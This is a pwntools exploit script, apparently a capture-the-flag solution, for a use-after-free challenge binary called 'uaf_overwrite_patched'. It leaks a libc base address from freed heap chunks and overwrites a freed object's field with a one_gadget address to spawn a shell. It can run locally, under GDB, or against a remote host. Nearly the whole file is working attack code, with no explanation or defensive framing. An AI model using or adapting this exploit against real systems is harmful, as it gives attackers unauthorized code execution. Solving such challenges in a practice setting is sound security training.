#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('uaf_overwrite_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
# context.terminal = ["tmux", "splitw", "-h"] 

context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
breakrva 0xb2c
breakrva 0xa55
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def human(weight, age):
    io.sendlineafter(b">", b"1")
    io.sendlineafter(b"Weight:", str(weight).encode())
    io.sendlineafter(b"Age:", str(age).encode())


def robot(weight):
    io.sendlineafter(b">", b"2")
    io.sendlineafter(b"Weight:", str(weight).encode())


def custom(size, data, idx=-1, leak=False):
    if leak:
        io.sendlineafter(b">", b"3")
        io.sendlineafter(b"Size:", str(size).encode())
        io.sendafter(b"Data:", data)
        io.recvuntil(b"Data: ")
        libc.address = u64((b"\xa0" + io.recvline().strip()[1:6]).ljust(8, b"\x00")) - 0x3ebca0
        io.sendlineafter(b"idx:", str(idx).encode())
        info("libc base: %#x", libc.address)
    else:
        io.sendlineafter(b">", b"3")
        io.sendlineafter(b"Size:", str(size).encode())
        io.sendafter(b"Data:", data)
        io.sendlineafter(b"idx:", str(idx).encode())


def solve():

    custom(0x500, b"A"*8, -1)
    custom(0x500, b"B"*8, 0)
    custom(0x500, b"B", leak=True)

    one_gadget = libc.address + 0x10a41c

    human(1, one_gadget)
    robot(1)

    io.interactive()


def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()

